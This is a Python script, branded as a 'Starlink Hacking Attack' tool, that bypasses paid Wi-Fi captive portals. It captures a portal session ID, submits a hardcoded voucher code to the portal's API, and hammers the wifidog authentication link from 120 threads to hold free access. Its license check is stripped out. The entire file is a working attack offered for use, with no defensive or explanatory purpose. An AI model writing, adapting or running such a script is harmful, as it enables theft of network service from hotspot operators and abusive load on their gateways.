import requests, re, time, threading, random, hashlib, platform, ssl, json, subprocess, os
from urllib.parse import urlparse, parse_qs, urljoin
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# No KEY_URL, no LICENSE_FILE needed anymore

def get_hwid():
    # ... same as original ...
    ID_STORAGE = ".device_id"
    if os.path.exists(ID_STORAGE):
        with open(ID_STORAGE, "r") as f:
            return f.read().strip()
    try:
        serial = subprocess.check_output("getprop ro.serialno", shell=True).decode().strip()
        if not serial or serial == "unknown" or "012345" in serial:
            serial = subprocess.check_output("settings get secure android_id", shell=True).decode().strip()
        if not serial:
            import uuid
            serial = str(uuid.getnode())
        raw_hash = hashlib.md5(serial.encode()).hexdigest()[:10].upper()
        new_id = f"TRB-{raw_hash}"
    except:
        new_id = f"TRB-{hashlib.md5(str(os.getlogin()).encode()).hexdigest()[:10].upper()}"
    with open(ID_STORAGE, "w") as f:
        f.write(new_id)
    return new_id

def banner():
    os.system('clear')
    print("\033[95m" + "         Developer @paing07709 - Starlink Hacking Attack ")

def check_license():
    # REMOVED all key checks. Always return True.
    banner()
    print("\033[92m[] License verification disabled. Proceeding freely.\033[0m")
    return True

def check_net():
    try:
        return requests.get("http://www.google.com/generate_204", timeout=3).status_code == 204
    except:
        return False

def high_speed_pulse(link):
    # same as original
    headers = {"User-Agent": "Mozilla/5.0...", "Connection": "keep-alive", "Cache-Control": "no-cache"}
    while True:
        try:
            requests.get(link, timeout=5, verify=False, headers=headers)
            print(f"\033[92m[] Dev_@Paing07709| >>> [{random.randint(40,180)}ms]\033[0m")
            time.sleep(0.01)
        except:
            time.sleep(1)
            break

def start_immortal():
    if not check_license():
        return
    while True:
        session = requests.Session()
        try:
            print("\033[94m[*] Dev_@Paing07709 Scanning Portal...\033[0m")
            r = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
            p_url = r.url
            r1 = session.get(p_url, verify=False, timeout=5)
            match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
            n_url = urljoin(p_url, match.group(1)) if match else p_url
            r2 = session.get(n_url, verify=False, timeout=5)
            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
            if sid:
                print(f"\033[96m[] SID Captured: {sid[:15]}\033[0m")
                p_host = f"{urlparse(p_url).scheme}://{urlparse(p_url).netloc}"
                session.post(f"{p_host}/api/auth/voucher/", json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1}, timeout=5)
                gw = parse_qs(urlparse(p_url).query).get('gw_address', ['192.168.60.1'])[0]
                port = parse_qs(urlparse(p_url).query).get('gw_port', ['2060'])[0]
                auth_link = f"http://{gw}:{port}/wifidog/auth?token={sid}"
                print("\033[95m[*] Launching High-Speed Stable Threads\033[0m")
                for _ in range(120):
                    threading.Thread(target=high_speed_pulse, args=(auth_link,), daemon=True).start()
                while True:
                    if not check_net():
                        print("\033[91m[!] Connection Lost! Re-injecting...\033[0m")
                        break
                    time.sleep(5)
            else:
                time.sleep(2)
        except Exception as e:
            print(f"\033[91m[!] Error: {e}\033[0m")
            time.sleep(2)

if __name__ == "__main__":
    try:
        start_immortal()
    except KeyboardInterrupt:
        print("\n\033[91m[!] Stopped by User.\033[0m")
